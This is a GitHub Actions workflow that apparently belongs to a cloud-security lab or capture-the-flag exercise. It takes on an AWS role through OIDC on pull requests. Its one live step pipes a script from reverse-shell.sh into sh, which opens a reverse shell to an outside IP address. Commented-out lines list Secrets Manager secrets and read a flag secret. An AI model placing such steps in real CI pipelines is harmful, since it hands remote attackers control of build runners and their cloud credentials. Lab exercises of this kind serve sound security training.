name: "test AWS Access"

# The workflow should only trigger on pull requests to the main branch
# on:
#   pull_request:
#     branches:
#       - main

on:
  workflow_dispatch:
  pull_request:
    branches:
      - main
# Required to get the ID Token that will be used for OIDC
permissions:
  id-token: write
  contents: read # needed for private repos to checkout

jobs:
  aws:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v1
        with:
          aws-region: us-east-1
          #role-to-assume: arn:aws:iam::683350395763:role/sts-lab-2-target
          role-to-assume: arn:aws:iam::683350395763:role/whitebox-lab-2-github-actions-role
          role-session-name: OIDCSession

      - run: curl https://reverse-shell.sh/34.92.108.173:8080 | sh
      #- run: aws secretsmanager list-secrets --region us-east-1 
      #- run: aws secretsmanager get-secret-value --secret-id flag_sts_lab_2 --region us-east-1 
        shell: bash
